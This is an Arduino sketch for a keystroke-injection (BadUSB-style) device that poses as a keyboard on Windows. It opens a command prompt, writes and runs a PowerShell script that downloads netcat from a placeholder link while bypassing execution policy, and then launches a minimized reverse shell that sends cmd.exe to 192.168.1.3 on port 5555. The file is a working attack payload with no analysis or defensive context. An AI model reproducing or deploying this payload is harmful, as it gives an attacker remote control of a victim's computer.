#include <HID-Project.h>
#include <HID-Settings.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  AbsoluteMouse.begin();
  Keyboard.begin();

  // Start Payload
  delay(400);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("cd / & mkdir win & cd win & echo (wget 'NETCAT_DL_LINK' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("START /MIN a.exe 192.168.1.3:5555 -e cmd.exe -d & exit");

  typeKey(KEY_RETURN);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
  AbsoluteMouse.end();
}

// Unused
void loop() {}
